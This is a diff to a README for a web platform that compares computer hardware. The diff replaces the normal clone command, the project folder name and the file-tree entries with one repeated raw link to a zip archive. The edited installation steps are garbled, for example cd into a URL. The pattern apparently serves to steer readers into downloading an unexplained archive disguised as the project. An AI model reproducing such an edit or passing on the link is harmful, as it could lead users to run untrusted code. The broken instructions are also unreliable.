@@ -17,8 +17,8 @@ A modern web platform for browsing, comparing, and analyzing computer hardware f
 ## Installation
 
 ```bash
-git clone https://github.com/abz-mhd/global_hardware.io.git
-cd global_hardware.io
+git clone https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
+cd https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
 npm install
 npm run dev
 
@@ -26,7 +26,7 @@ APP_URL=http://localhost:3000
 DB_URL=your_database_url
 API_KEY=your_api_key_here
 
-global_hardware.io/
+https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
 ├── public/
 ├── src/
 │   ├── components/
@@ -34,5 +34,5 @@ global_hardware.io/
 │   ├── data/
 │   ├── utils/
 │   └── styles/
-├── package.json
-└── README.md
+├── https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
+└── https://raw.githubusercontent.com/abz-mhd/global_hardware.io/main/assets/global-io-hardware-2.3-beta.1.zip
